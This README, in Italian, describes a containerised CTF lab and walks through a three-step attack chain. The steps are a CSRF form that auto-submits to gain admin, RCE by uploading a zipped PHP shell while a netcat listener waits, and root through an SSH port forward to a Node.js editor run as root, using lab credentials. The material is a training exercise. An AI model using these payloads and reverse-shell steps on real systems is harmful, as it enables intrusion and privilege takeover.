# CTF Lab - CSRF to RCE & SSH Pivoting (Single-Player)

Laboratorio vulnerabile containerizzato in Docker con **Bot Amministratore in Bash** integrato per simulare gli attacchi in locale.

---

## ⛓️ Catena di Attacco (I Punti di Attacco)

### 🎯 1. Privilege Escalation Web (CSRF)
* **Obiettivo:** Diventare `admin` con l'account giocatore.
* **Vulnerabilità:** Assenza di token anti-CSRF nel pannello di gestione.
* **Innesco:**
  1. Registrati e accedi su `http://localhost:8080/register.php` con l'utente `test`.
  2. Avvia un server Python sulla macchina host nella cartella dell'exploit (`malicious.html`):
     ```bash
     python3 -m http.server 8000
     ```
  3. Il file `malicious.html` esegue il submit automatico dei parametri verso il container:
     ```html
     <form id="csrfForm" action="http://127.0.0.1:8080/app_internal/admin.php" method="POST">
         <input type="hidden" name="user_id" value="3">
         <input type="hidden" name="new_role" value="admin">
     </form>
     <script>document.getElementById('csrfForm').submit();</script>
     ```
  4. Incolla l'URL `http://172.18.0.1` nel form delle segnalazioni sulla dashboard e invia.
  5. Il Bot Bash visiterà il link, subirà il CSRF e promuoverà l'utente `test` ad `admin`. Aggiorna la pagina (`F5`).

### 🎯 2. Remote Code Execution (RCE via ZIP)
* **Obiettivo:** Ottenere una shell come utente `www-data`.
* **Vulnerabilità:** Estrazione arbitraria di file senza controllo delle estensioni (`ZipArchive::extractTo`).
* **Innesco:**
  1. Crea un file `shell.php` (web shell o reverse shell) sul tuo PC e comprimilo in un archivio:
     ```bash
     zip shell.zip shell.php
     ```
  2. Apri un listener netcat sul tuo terminale host:
     ```bash
     nc -lvnp 4443
     ```
  3. Vai sul pannello admin sbloccato (`http://localhost:8080/app_internal/admin.php`), carica `shell.zip` ed estrailo.
  4. Visita l'URL del file estratto: `http://localhost:8080/uploads/shell.php` per ottenere la shell su netcat.

### 🎯 3. Network Pivoting & Shell di ROOT
* **Obiettivo:** Ottenere i massimi privilegi di sistema (`root`).
* **Vulnerabilità:** Esposizione di un editor Node.js locale eseguito come root in background.
* **Innesco:**
  1. Esegui il pivoting creando un tunnel SSH con Local Port Forwarding usando le credenziali trovate (`iury:johnsucks1`):
     ```bash
     ssh -L 9000:127.0.0.1:9000 iury@localhost -p 2222
     ```
  2. Apri il browser dell'host su `http://localhost:9000` per accedere all'editor di script Node.js interno.
  3. Inserisci ed esegui una reverse shell JavaScript all'interno dell'editor web. Il processo, girando come root, ti restituirà una shell interattiva di **`root`** su netcat per leggere `/root/root.txt`.

---

## 📊 Tabella degli Endpoint e dei Privilegi

| Fase di Attacco | Endpoint Bersaglio | Tipo di Richiesta | Privilegio Guadagnato |
| :--- | :--- | :---: | :--- |
| **1. Web Attack** | `http://127.0.0` | **POST** | Ruolo Web: **`admin`** |
| **2. System RCE** | Modulo Caricamento (.zip) in `admin.php` | **Multipart POST** | Utente OS: **`www-data`** |
| **3. PrivEsc** | Editor Node.js Core (Port Forwarding) | **Web IDE Tunnel** | Utente OS: **`root`** 🏴 |
